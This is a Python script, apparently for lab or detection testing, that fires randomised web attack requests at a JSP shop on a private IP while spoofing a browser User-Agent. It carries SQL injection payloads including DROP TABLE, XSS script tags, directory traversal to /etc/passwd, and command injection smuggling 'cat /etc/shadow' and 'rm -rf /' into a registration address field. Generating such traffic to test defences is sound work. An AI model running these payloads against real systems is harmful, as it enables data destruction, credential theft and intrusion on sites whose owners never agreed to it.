import requests
import random

# URL do servidor (substitua pelo endereço do seu servidor)
server_url = "http://192.168.15.12/"

# Headers comuns para parecer uma navegação legítima
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
}

# Funções para enviar diferentes tipos de ataques com parâmetros variáveis

def sql_injection():
    url = f"{server_url}/public/anadir.jsp"
    possible_params = [
        {"id": "2", "name": "Manchego Cheese", "price": "50", "quantity": "' OR '1'='1", "B1": "Buy"},
        {"id": "3", "name": "Olive Oil", "price": "60", "quantity": "'; DROP TABLE orders; --", "B1": "Add"},
        {"id": "4", "name": "Paella", "price": "30", "quantity": "5 OR 1=1", "B1": "Add to cart"}
    ]
    params = random.choice(possible_params)
    response = requests.get(url, params=params, headers=headers)
    print("SQL Injection Test:", response.status_code)

def xss_attack():
    url = f"{server_url}/public/authenticate.jsp"
    possible_params = [
        {"mode": "login", "username": "<script>alert('XSS')</script>", "password": "password123", "remember": "on", "B1": "Login"},
        {"mode": "login", "username": "<img src=x onerror=alert('XSS')>", "password": "securepass", "remember": "on", "B1": "Login"},
        {"mode": "login", "username": "<svg onload=alert('XSS')>", "password": "mypassword", "remember": "off", "B1": "Sign in"}
    ]
    params = random.choice(possible_params)
    response = requests.get(url, params=params, headers=headers)
    print("XSS Attack Test:", response.status_code)

def directory_traversal():
    url = f"{server_url}/public/features.jsp"
    possible_params = [
        {"id": "../../etc/passwd"},
        {"id": "../../../boot.ini"},
        {"id": "../../confidential.txt"}
    ]
    params = random.choice(possible_params)
    response = requests.get(url, params=params, headers=headers)
    print("Directory Traversal Test:", response.status_code)

def command_injection():
    url = f"{server_url}/public/register.jsp"
    possible_params = [
        {
            "mode": "register",
            "username": "user1",
            "password": "pass1",
            "first_name": "user1",
            "address": "127.0.0.1; ls -la;",
            "city": "City",
            "postal_code": "12345",
            "state": "TestState",
            "credit_card": "4111111111111111",
            "B1": "Register"
        },
        {
            "mode": "register",
            "username": "user2",
            "password": "pass2",
            "first_name": "user2",
            "address": "localhost; cat /etc/shadow;",
            "city": "Town",
            "postal_code": "54321",
            "state": "AnotherState",
            "credit_card": "4222222222222222",
            "B1": "Sign Up"
        },
        {
            "mode": "register",
            "username": "user3",
            "password": "pass3",
            "first_name": "user3",
            "address": "192.168.0.1; rm -rf /;",
            "city": "Village",
            "postal_code": "67890",
            "state": "SampleState",
            "credit_card": "4333333333333333",
            "B1": "Submit"
        }
    ]
    params = random.choice(possible_params)
    response = requests.get(url, params=params, headers=headers)
    print("Command Injection Test:", response.status_code)

# Executar todos os testes com parâmetros variáveis
def run_tests():
    print("Starting malicious request tests with variable parameters...\n")
    sql_injection()
    xss_attack()
    directory_traversal()
    command_injection()
    print("\nTests completed.")

# Rodar os testes
run_tests()
